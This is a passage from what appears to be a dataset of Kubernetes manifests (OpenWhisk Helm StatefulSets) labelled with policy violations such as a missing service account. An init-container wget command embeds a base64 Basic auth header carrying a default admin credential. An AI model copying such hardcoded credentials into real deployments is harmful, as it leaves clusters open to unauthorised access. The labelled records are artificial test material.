\\\"swift:4.2\\\",\\n                \\\"default\\\"\\\n            : true,\\n                \\\"image\\\": {\\n                    \\\"prefix\\\"\\\n            : \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"action-swift-v4.2\\\"\\\n            ,\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n                },\\n     \\\n            \\           \\\"deprecated\\\": false,\\n                \\\"attached\\\": {\\n\\\n            \\                    \\\"attachmentName\\\": \\\"codefile\\\",\\n             \\\n            \\       \\\"attachmentType\\\": \\\"text/plain\\\"\\n                }\\n      \\\n            \\      },\\n            {\\n                \\\"kind\\\": \\\"swift:5.1\\\",\\n \\\n            \\               \\\"default\\\": false,\\n                \\\"image\\\": {\\n  \\\n            \\                  \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"\\\n            name\\\": \\\"action-swift-v5.1\\\",\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\\n            \\n                },\\n                \\\"deprecated\\\": false,\\n       \\\n            \\         \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"\\\n            codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n\\\n            \\                }\\n            },\\n            {\\n                \\\"\\\n            kind\\\": \\\"swift:5.3\\\",\\n                \\\"default\\\": false,\\n        \\\n            \\        \\\"image\\\": {\\n                    \\\"prefix\\\": \\\"openwhisk\\\",\\n\\\n            \\                    \\\"name\\\": \\\"action-swift-v5.3\\\",\\n              \\\n            \\      \\\"tag\\\": \\\"1.17.0\\\"\\n                },\\n                \\\"deprecated\\\"\\\n            : false,\\n                \\\"attached\\\": {\\n                    \\\"attachmentName\\\"\\\n            : \\\"codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\\n            \\n                }\\n            },\\n            {\\n                \\\"\\\n            kind\\\": \\\"swift:5.4\\\",\\n                \\\"default\\\": false,\\n        \\\n            \\        \\\"image\\\": {\\n                    \\\"prefix\\\": \\\"openwhisk\\\",\\n\\\n            \\                    \\\"name\\\": \\\"action-swift-v5.4\\\",\\n              \\\n            \\      \\\"tag\\\": \\\"1.17.0\\\"\\n                },\\n                \\\"deprecated\\\"\\\n            : false,\\n                \\\"attached\\\": {\\n                    \\\"attachmentName\\\"\\\n            : \\\"codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\\n            \\n                }\\n            }\\n        ],\\n        \\\"java\\\": [\\n\\\n            \\            {\\n                \\\"kind\\\": \\\"java:8\\\",\\n              \\\n            \\  \\\"default\\\": true,\\n                \\\"image\\\": {\\n                \\\n            \\    \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"java8action\\\"\\\n            ,\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n                },\\n     \\\n            \\           \\\"deprecated\\\": false,\\n                \\\"attached\\\": {\\n\\\n            \\                    \\\"attachmentName\\\": \\\"jarfile\\\",\\n              \\\n            \\      \\\"attachmentType\\\": \\\"application/java-archive\\\"\\n            \\\n            \\    },\\n                \\\"requireMain\\\": true\\n            }\\n      \\\n            \\  ],\\n        \\\"php\\\": [\\n            {\\n                \\\"kind\\\": \\\"\\\n            php:7.3\\\",\\n                \\\"default\\\": false,\\n                \\\"deprecated\\\"\\\n            : false,\\n                \\\"image\\\": {\\n                    \\\"prefix\\\"\\\n            : \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"action-php-v7.3\\\",\\n\\\n            \\                    \\\"tag\\\": \\\"1.17.0\\\"\\n                },\\n       \\\n            \\         \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"\\\n            codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n\\\n            \\                }\\n            },\\n            {\\n                \\\"\\\n            kind\\\": \\\"php:7.4\\\",\\n                \\\"default\\\": true,\\n           \\\n            \\     \\\"deprecated\\\": false,\\n                \\\"image\\\": {\\n         \\\n            \\           \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\":\\\n            \\ \\\"action-php-v7.4\\\",\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n    \\\n            \\            },\\n                \\\"attached\\\": {\\n                   \\\n            \\ \\\"attachmentName\\\": \\\"codefile\\\",\\n                    \\\"attachmentType\\\"\\\n            : \\\"text/plain\\\"\\n                }\\n            },\\n            {\\n \\\n            \\               \\\"kind\\\": \\\"php:8.0\\\",\\n                \\\"default\\\": false,\\n\\\n            \\                \\\"deprecated\\\": false,\\n                \\\"image\\\": {\\n\\\n            \\                    \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"\\\n            name\\\": \\\"action-php-v7.4\\\",\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n\\\n            \\                },\\n                \\\"attached\\\": {\\n               \\\n            \\     \\\"attachmentName\\\": \\\"codefile\\\",\\n                    \\\"attachmentType\\\"\\\n            : \\\"text/plain\\\"\\n                }\\n            }\\n        ],\\n     \\\n            \\   \\\"ruby\\\": [\\n            {\\n                \\\"kind\\\": \\\"ruby:2.5\\\"\\\n            ,\\n                \\\"default\\\": true,\\n                \\\"deprecated\\\"\\\n            : false,\\n                \\\"attached\\\": {\\n                    \\\"attachmentName\\\"\\\n            : \\\"codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\\n            \\n                },\\n                \\\"image\\\": {\\n                 \\\n            \\   \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"action-ruby-v2.5\\\"\\\n            ,\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n                }\\n      \\\n            \\      }\\n        ],\\n        \\\"go\\\": [\\n            {\\n             \\\n            \\   \\\"kind\\\": \\\"go:1.15\\\",\\n                \\\"default\\\": true,\\n     \\\n            \\           \\\"deprecated\\\": false,\\n                \\\"attached\\\": {\\n\\\n            \\                    \\\"attachmentName\\\": \\\"codefile\\\",\\n             \\\n            \\       \\\"attachmentType\\\": \\\"text/plain\\\"\\n                },\\n     \\\n            \\           \\\"image\\\": {\\n                    \\\"prefix\\\": \\\"openwhisk\\\"\\\n            ,\\n                    \\\"name\\\": \\\"action-golang-v1.15\\\",\\n          \\\n            \\          \\\"tag\\\": \\\"1.18.0\\\"\\n                }\\n            }\\n   \\\n            \\     ],\\n        \\\"rust\\\": [\\n            {\\n                \\\"kind\\\"\\\n            : \\\"rust:1.34\\\",\\n                \\\"default\\\": true,\\n               \\\n            \\ \\\"deprecated\\\": false,\\n                \\\"attached\\\": {\\n          \\\n            \\          \\\"attachmentName\\\": \\\"codefile\\\",\\n                    \\\"attachmentType\\\"\\\n            : \\\"text/plain\\\"\\n                },\\n                \\\"image\\\": {\\n \\\n            \\                   \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"\\\n            name\\\": \\\"action-rust-v1.34\\\",\\n                    \\\"tag\\\": \\\"1.3.0\\\"\\\n            \\n                }\\n            }\\n        ],\\n        \\\"dotnet\\\": [\\n\\\n            \\            {\\n                \\\"kind\\\": \\\"dotnet:2.2\\\",\\n          \\\n            \\      \\\"default\\\": true,\\n                \\\"deprecated\\\": false,\\n  \\\n            \\              \\\"requireMain\\\": true,\\n                \\\"image\\\": {\\n\\\n            \\                    \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"\\\n            name\\\": \\\"action-dotnet-v2.2\\\",\\n                    \\\"tag\\\": \\\"1.16.0\\\"\\\n            \\n                },\\n                \\\"attached\\\": {\\n              \\\n            \\      \\\"attachmentName\\\": \\\"codefile\\\",\\n                    \\\"attachmentType\\\"\\\n            : \\\"text/plain\\\"\\n                }\\n            },\\n            {\\n \\\n            \\               \\\"kind\\\": \\\"dotnet:3.1\\\",\\n                \\\"default\\\"\\\n            : false,\\n                \\\"deprecated\\\": false,\\n                \\\"requireMain\\\"\\\n            : true,\\n                \\\"image\\\": {\\n                    \\\"prefix\\\"\\\n            : \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"action-dotnet-v3.1\\\"\\\n            ,\\n                    \\\"tag\\\": \\\"1.16.0\\\"\\n                },\\n     \\\n            \\           \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"\\\n            codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n\\\n            \\                }\\n            }\\n        ],\\n        \\\"ballerina\\\":\\\n            \\ [\\n            {\\n                \\\"kind\\\": \\\"ballerina:0.990\\\",\\n \\\n            \\               \\\"default\\\": true,\\n                \\\"image\\\": {\\n   \\\n            \\                 \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\"\\\n            : \\\"action-ballerina-v0.990.2\\\",\\n                    \\\"tag\\\": \\\"nightly\\\"\\\n            \\n                },\\n                \\\"deprecated\\\": false,\\n       \\\n            \\         \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"\\\n            codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n\\\n            \\                }\\n            }\\n        ]\\n    },\\n    \\\"blackboxes\\\"\\\n            : [\\n        {\\n            \\\"prefix\\\": \\\"openwhisk\\\",\\n            \\\"\\\n            name\\\": \\\"dockerskeleton\\\",\\n            \\\"tag\\\": \\\"1.14.0\\\"\\n       \\\n            \\ }\\n    ]\\n}\\n\"\n        - name: LIMITS_ACTIONS_INVOKES_PERMINUTE\n          value: '60'\n        - name: LIMITS_ACTIONS_INVOKES_CONCURRENT\n          value: '30'\n        - name: LIMITS_TRIGGERS_FIRES_PERMINUTE\n          value: '60'\n        - name: LIMITS_ACTIONS_SEQUENCE_MAXLENGTH\n          value: '50'\n        - name: CONFIG_whisk_timeLimit_min\n          value: 100ms\n        - name: CONFIG_whisk_timeLimit_max\n          value: 5m\n        - name: CONFIG_whisk_timeLimit_std\n          value: 1m\n        - name: CONFIG_whisk_memory_min\n          value: 128m\n        - name: CONFIG_whisk_memory_max\n          value: 512m\n        - name: CONFIG_whisk_memory_std\n          value: 256m\n        - name: CONFIG_whisk_concurrencyLimit_min\n          value: '1'\n        - name: CONFIG_whisk_concurrencyLimit_max\n          value: '1'\n        - name: CONFIG_whisk_concurrencyLimit_std\n          value: '1'\n        - name: CONFIG_whisk_logLimit_min\n          value: 0m\n        - name: CONFIG_whisk_logLimit_max\n          value: 10m\n        - name: CONFIG_whisk_logLimit_std\n          value: 10m\n        - name: CONFIG_whisk_activation_payload_max\n          value: '1048576'\n        - name: CONFIG_whisk_loadbalancer_blackboxFraction\n          value: 10%\n        - name: CONFIG_whisk_loadbalancer_timeoutFactor\n          value: '2'\n        - name: KAFKA_HOSTS\n          value: RELEASE-NAME-kafka-0.RELEASE-NAME-kafka.default.svc.cluster.local:9092\n        - name: CONFIG_whisk_kafka_replicationFactor\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_cacheInvalidation_retentionBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_cacheInvalidation_retentionMs\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_cacheInvalidation_segmentBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_completed_retentionBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_completed_retentionMs\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_completed_segmentBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_events_retentionBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_events_retentionMs\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_events_segmentBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_health_retentionBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_health_retentionMs\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_health_segmentBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_invoker_retentionBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_invoker_retentionMs\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_invoker_segmentBytes\n          value: ''\n        - name: CONFIG_whisk_couchdb_username\n          valueFrom:\n            secretKeyRef:\n              name: RELEASE-NAME-db.auth\n              key: db_username\n        - name: CONFIG_whisk_couchdb_password\n          valueFrom:\n            secretKeyRef:\n              name: RELEASE-NAME-db.auth\n              key: db_password\n        - name: CONFIG_whisk_couchdb_port\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_port\n        - name: CONFIG_whisk_couchdb_protocol\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_protocol\n        - name: CONFIG_whisk_couchdb_host\n          value: RELEASE-NAME-couchdb.default.svc.cluster.local\n        - name: CONFIG_whisk_couchdb_provider\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_provider\n        - name: CONFIG_whisk_couchdb_databases_WhiskActivation\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_whisk_activations\n        - name: CONFIG_whisk_couchdb_databases_WhiskEntity\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_whisk_actions\n        - name: CONFIG_whisk_couchdb_databases_WhiskAuth\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_whisk_auths\n        - name: CONTROLLER_INSTANCES\n          value: '1'\n        - name: CONFIG_logback_log_level\n          value: INFO\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"RELEASE-NAME-core\" not found"
  },
  {
    "id": "10549",
    "manifest_path": "data/manifests/the_stack_sample/sample_4076.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: RELEASE-NAME-controller\n  labels:\n    name: RELEASE-NAME-controller\n    heritage: Helm\n    release: RELEASE-NAME\n    chart: openwhisk-1.0.1\n    app: RELEASE-NAME-openwhisk\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: RELEASE-NAME-controller\n  template:\n    metadata:\n      labels:\n        name: RELEASE-NAME-controller\n        heritage: Helm\n        release: RELEASE-NAME\n        chart: openwhisk-1.0.1\n        app: RELEASE-NAME-openwhisk\n    spec:\n      serviceAccountName: RELEASE-NAME-core\n      affinity:\n        nodeAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - weight: 100\n            preference:\n              matchExpressions:\n              - key: openwhisk-role\n                operator: NotIn\n                values:\n                - invoker\n          - weight: 80\n            preference:\n              matchExpressions:\n              - key: openwhisk-role\n                operator: In\n                values:\n                - core\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: name\n                operator: In\n                values:\n                - RELEASE-NAME-controller\n            topologyKey: kubernetes.io/hostname\n      initContainers:\n      - name: wait-for-kafka\n        image: openwhisk/ow-utils:3e6138d\n        imagePullPolicy: IfNotPresent\n        command:\n        - sh\n        - -c\n        - 'cacert=\"/var/run/secrets/kubernetes.io/serviceaccount/ca.crt\"; token=\"$(cat\n          /var/run/secrets/kubernetes.io/serviceaccount/token)\"; while true; do rc=$(curl\n          -sS --cacert $cacert --header \"Authorization: Bearer $token\" https://kubernetes.default.svc/api/v1/namespaces/default/endpoints/RELEASE-NAME-kafka\n          | jq -r \".subsets[].addresses | length\"); echo \"num ready kafka endpoints\n          is $rc\"; if [ $rc -gt 0 ]; then echo \"Success: ready kafka endpoint!\"; break;\n          fi; echo \"kafka not ready yet; sleeping for 3 seconds\"; sleep 3; done;'\n      - name: wait-for-couchdb\n        image: busybox:latest\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: READINESS_URL\n          value: http://RELEASE-NAME-couchdb.default.svc.cluster.local:5984/ow_kube_couchdb_initialized_marker\n        command:\n        - sh\n        - -c\n        - 'while true; do echo ''checking CouchDB readiness''; wget -T 5 --spider\n          $READINESS_URL --header=\"Authorization: Basic d2hpc2tfYWRtaW46c29tZV9wYXNzdzByZA==\";\n          result=$?; if [ $result -eq 0 ]; then echo ''Success: CouchDB is ready!'';\n          break; fi; echo ''...not ready yet; sleeping 3 seconds before retry''; sleep\n          3; done;'\n      containers:\n      - name: controller\n        imagePullPolicy: IfNotPresent\n        image: openwhisk/controller:3e6138d\n        command:\n        - /bin/bash\n        - -c\n        - /init.sh `hostname | awk -F '-' '{print $NF}'`\n        ports:\n        - name: controller\n          containerPort: 8080\n        - name: akka-remoting\n          containerPort: 2552\n        - name: akka-mgmt-http\n          containerPort: 19999\n        livenessProbe:\n          httpGet:\n            path: /ping\n            port: 8080\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          timeoutSeconds: 1\n        readinessProbe:\n          httpGet:\n            path: /ping\n            port: 8080\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          timeoutSeconds: 1\n        env:\n        - name: PORT\n          value: '8080'\n        - name: TZ\n          value: UTC\n        - name: CONFIG_whisk_info_date\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-whisk.config\n              key: whisk_info_date\n        - name: CONFIG_whisk_info_buildNo\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-whisk.config\n              key: whisk_info_buildNo\n        - name: JAVA_OPTS\n          value: '-Xmx1024M '\n        - name: CONTROLLER_OPTS\n          value: ' '\n        - name: RUNTIMES_MANIFEST\n          value: \"{\\n    \\\"runtimes\\\": {\\n        \\\"nodejs\\\": [\\n            {\\n \\\n            \\               \\\"kind\\\": \\\"nodejs:12\\\",\\n                \\\"default\\\"\\\n            : false,\\n                \\\"image\\\": {\\n                    \\\"prefix\\\"\\\n            : \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"action-nodejs-v12\\\"\\\n            ,\\n                    \\\"tag\\\": \\\"1.19.0\\\"\\n                },\\n     \\\n            \\           \\\"deprecated\\\": false,\\n                \\\"attached\\\": {\\n\\\n            \\                    \\\"attachmentName\\\": \\\"codefile\\\",\\n             \\\n            \\       \\\"attachmentType\\\": \\\"text/plain\\\"\\n                }\\n      \\\n            \\      },\\n            {\\n                \\\"kind\\\": \\\"nodejs:14\\\",\\n \\\n            \\               \\\"default\\\": true,\\n                \\\"image\\\": {\\n   \\\n            \\                 \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\"\\\n            : \\\"action-nodejs-v14\\\",\\n                    \\\"tag\\\": \\\"1.19.0\\\"\\n  \\\n            \\              },\\n                \\\"deprecated\\\": false,\\n          \\\n            \\      \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"codefile\\\"\\\n            ,\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n          \\\n            \\      },\\n                \\\"stemCells\\\": [\\n                    {\\n \\\n            \\                       \\\"initialCount\\\": 2,\\n                       \\\n            \\ \\\"memory\\\": \\\"256 MB\\\",\\n                        \\\"reactive\\\": {\\n \\\n            \\                           \\\"minCount\\\": 1,\\n                       \\\n            \\     \\\"maxCount\\\": 4,\\n                            \\\"ttl\\\": \\\"2 minutes\\\"\\\n            ,\\n                            \\\"threshold\\\": 1,\\n                   \\\n            \\         \\\"increment\\\": 1\\n                        }\\n              \\\n            \\      }\\n                ]\\n            }\\n        ],\\n        \\\"python\\\"\\\n            : [\\n            {\\n                \\\"kind\\\": \\\"python:3\\\",\\n        \\\n            \\        \\\"default\\\": true,\\n                \\\"image\\\": {\\n          \\\n            \\          \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"\\\n            action-python-v3.7\\\",\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n     \\\n            \\           },\\n                \\\"deprecated\\\": false,\\n             \\\n            \\   \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"codefile\\\"\\\n            ,\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n          \\\n            \\      }\\n            }\\n        ],\\n        \\\"swift\\\": [\\n          \\\n            \\  {\\n                \\\"kind\\\": \\\"swift:4.2\\\",\\n                \\\"default\\\"\\\n            : true,\\n                \\\"image\\\": {\\n                    \\\"prefix\\\"\\\n            : \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"action-swift-v4.2\\\"\\\n            ,\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n                },\\n     \\\n            \\           \\\"deprecated\\\": false,\\n                \\\"attached\\\": {\\n\\\n            \\                    \\\"attachmentName\\\": \\\"codefile\\\",\\n             \\\n            \\       \\\"attachmentType\\\": \\\"text/plain\\\"\\n                }\\n      \\\n            \\      },\\n            {\\n                \\\"kind\\\": \\\"swift:5.1\\\",\\n \\\n            \\               \\\"default\\\": false,\\n                \\\"image\\\": {\\n  \\\n            \\                  \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"\\\n            name\\\": \\\"action-swift-v5.1\\\",\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\\n            \\n                },\\n                \\\"deprecated\\\": false,\\n       \\\n            \\         \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"\\\n            codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n\\\n            \\                }\\n            },\\n            {\\n                \\\"\\\n            kind\\\": \\\"swift:5.3\\\",\\n                \\\"default\\\": false,\\n        \\\n            \\        \\\"image\\\": {\\n                    \\\"prefix\\\": \\\"openwhisk\\\",\\n\\\n            \\                    \\\"name\\\": \\\"action-swift-v5.3\\\",\\n              \\\n            \\      \\\"tag\\\": \\\"1.17.0\\\"\\n                },\\n                \\\"deprecated\\\"\\\n            : false,\\n                \\\"attached\\\": {\\n                    \\\"attachmentName\\\"\\\n            : \\\"codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\\n            \\n                }\\n            },\\n            {\\n                \\\"\\\n            kind\\\": \\\"swift:5.4\\\",\\n                \\\"default\\\": false,\\n        \\\n            \\        \\\"image\\\": {\\n                    \\\"prefix\\\": \\\"openwhisk\\\",\\n\\\n            \\                    \\\"name\\\": \\\"action-swift-v5.4\\\",\\n              \\\n            \\      \\\"tag\\\": \\\"1.17.0\\\"\\n                },\\n                \\\"deprecated\\\"\\\n            : false,\\n                \\\"attached\\\": {\\n                    \\\"attachmentName\\\"\\\n            : \\\"codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\\n            \\n                }\\n            }\\n        ],\\n        \\\"java\\\": [\\n\\\n            \\            {\\n                \\\"kind\\\": \\\"java:8\\\",\\n              \\\n            \\  \\\"default\\\": true,\\n                \\\"image\\\": {\\n                \\\n            \\    \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"java8action\\\"\\\n            ,\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n                },\\n     \\\n            \\           \\\"deprecated\\\": false,\\n                \\\"attached\\\": {\\n\\\n            \\                    \\\"attachmentName\\\": \\\"jarfile\\\",\\n              \\\n            \\      \\\"attachmentType\\\": \\\"application/java-archive\\\"\\n            \\\n            \\    },\\n                \\\"requireMain\\\": true\\n            }\\n      \\\n            \\  ],\\n        \\\"php\\\": [\\n            {\\n                \\\"kind\\\": \\\"\\\n            php:7.3\\\",\\n                \\\"default\\\": false,\\n                \\\"deprecated\\\"\\\n            : false,\\n                \\\"image\\\": {\\n                    \\\"prefix\\\"\\\n            : \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"action-php-v7.3\\\",\\n\\\n            \\                    \\\"tag\\\": \\\"1.17.0\\\"\\n                },\\n       \\\n            \\         \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"\\\n            codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n\\\n            \\                }\\n            },\\n            {\\n                \\\"\\\n            kind\\\": \\\"php:7.4\\\",\\n                \\\"default\\\": true,\\n           \\\n            \\     \\\"deprecated\\\": false,\\n                \\\"image\\\": {\\n         \\\n            \\           \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\":\\\n            \\ \\\"action-php-v7.4\\\",\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n    \\\n            \\            },\\n                \\\"attached\\\": {\\n                   \\\n            \\ \\\"attachmentName\\\": \\\"codefile\\\",\\n                    \\\"attachmentType\\\"\\\n            : \\\"text/plain\\\"\\n                }\\n            },\\n            {\\n \\\n            \\               \\\"kind\\\": \\\"php:8.0\\\",\\n                \\\"default\\\": false,\\n\\\n            \\                \\\"deprecated\\\": false,\\n                \\\"image\\\": {\\n\\\n            \\                    \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"\\\n            name\\\": \\\"action-php-v7.4\\\",\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n\\\n            \\                },\\n                \\\"attached\\\": {\\n               \\\n            \\     \\\"attachmentName\\\": \\\"codefile\\\",\\n                    \\\"attachmentType\\\"\\\n            : \\\"text/plain\\\"\\n                }\\n            }\\n        ],\\n     \\\n            \\   \\\"ruby\\\": [\\n            {\\n                \\\"kind\\\": \\\"ruby:2.5\\\"\\\n            ,\\n                \\\"default\\\": true,\\n                \\\"deprecated\\\"\\\n            : false,\\n                \\\"attached\\\": {\\n                    \\\"attachmentName\\\"\\\n            : \\\"codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\\n            \\n                },\\n                \\\"image\\\": {\\n                 \\\n            \\   \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"action-ruby-v2.5\\\"\\\n            ,\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n                }\\n      \\\n            \\      }\\n        ],\\n        \\\"go\\\": [\\n            {\\n             \\\n            \\   \\\"kind\\\": \\\"go:1.15\\\",\\n                \\\"default\\\": true,\\n     \\\n            \\           \\\"deprecated\\\": false,\\n                \\\"attached\\\": {\\n\\\n            \\                    \\\"attachmentName\\\": \\\"codefile\\\",\\n             \\\n            \\       \\\"attachmentType\\\": \\\"text/plain\\\"\\n                },\\n     \\\n            \\           \\\"image\\\": {\\n                    \\\"prefix\\\": \\\"openwhisk\\\"\\\n            ,\\n                    \\\"name\\\": \\\"action-golang-v1.15\\\",\\n          \\\n            \\          \\\"tag\\\": \\\"1.18.0\\\"\\n                }\\n            }\\n   \\\n            \\     ],\\n        \\\"rust\\\": [\\n            {\\n                \\\"kind\\\"\\\n            : \\\"rust:1.34\\\",\\n                \\\"default\\\": true,\\n               \\\n            \\ \\\"deprecated\\\": false,\\n                \\\"attached\\\": {\\n          \\\n            \\          \\\"attachmentName\\\": \\\"codefile\\\",\\n                    \\\"attachmentType\\\"\\\n            : \\\"text/plain\\\"\\n                },\\n                \\\"image\\\": {\\n \\\n            \\                   \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"\\\n            name\\\": \\\"action-rust-v1.34\\\",\\n                    \\\"tag\\\": \\\"1.3.0\\\"\\\n            \\n                }\\n            }\\n        ],\\n        \\\"dotnet\\\": [\\n\\\n            \\            {\\n                \\\"kind\\\": \\\"dotnet:2.2\\\",\\n          \\\n            \\      \\\"default\\\": true,\\n                \\\"deprecated\\\": false,\\n  \\\n            \\              \\\"requireMain\\\": true,\\n                \\\"image\\\": {\\n\\\n            \\                    \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"\\\n            name\\\": \\\"action-dotnet-v2.2\\\",\\n                    \\\"tag\\\": \\\"1.16.0\\\"\\\n            \\n                },\\n                \\\"attached\\\": {\\n              \\\n            \\      \\\"attachmentName\\\": \\\"codefile\\\",\\n                    \\\"attachmentType\\\"\\\n            : \\\"text/plain\\\"\\n                }\\n            },\\n            {\\n \\\n            \\               \\\"kind\\\": \\\"dotnet:3.1\\\",\\n                \\\"default\\\"\\\n            : false,\\n                \\\"deprecated\\\": false,\\n                \\\"requireMain\\\"\\\n            : true,\\n                \\\"image\\\": {\\n                    \\\"prefix\\\"\\\n            : \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"action-dotnet-v3.1\\\"\\\n            ,\\n                    \\\"tag\\\": \\\"1.16.0\\\"\\n                },\\n     \\\n            \\           \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"\\\n            codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n\\\n            \\                }\\n            }\\n        ],\\n        \\\"ballerina\\\":\\\n            \\ [\\n            {\\n                \\\"kind\\\": \\\"ballerina:0.990\\\",\\n \\\n            \\               \\\"default\\\": true,\\n                \\\"image\\\": {\\n   \\\n            \\                 \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\"\\\n            : \\\"action-ballerina-v0.990.2\\\",\\n                    \\\"tag\\\": \\\"nightly\\\"\\\n            \\n                },\\n                \\\"deprecated\\\": false,\\n       \\\n            \\         \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"\\\n            codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n\\\n            \\                }\\n            }\\n        ]\\n    },\\n    \\\"blackboxes\\\"\\\n            : [\\n        {\\n            \\\"prefix\\\": \\\"openwhisk\\\",\\n            \\\"\\\n            name\\\": \\\"dockerskeleton\\\",\\n            \\\"tag\\\": \\\"1.14.0\\\"\\n       \\\n            \\ }\\n    ]\\n}\\n\"\n        - name: LIMITS_ACTIONS_INVOKES_PERMINUTE\n          value: '60'\n        - name: LIMITS_ACTIONS_INVOKES_CONCURRENT\n          value: '30'\n        - name: LIMITS_TRIGGERS_FIRES_PERMINUTE\n          value: '60'\n        - name: LIMITS_ACTIONS_SEQUENCE_MAXLENGTH\n          value: '50'\n        - name: CONFIG_whisk_timeLimit_min\n          value: 100ms\n        - name: CONFIG_whisk_timeLimit_max\n          value: 5m\n        - name: CONFIG_whisk_timeLimit_std\n          value: 1m\n        - name: CONFIG_whisk_memory_min\n          value: 128m\n        - name: CONFIG_whisk_memory_max\n          value: 512m\n        - name: CONFIG_whisk_memory_std\n          value: 256m\n        - name: CONFIG_whisk_concurrencyLimit_min\n          value: 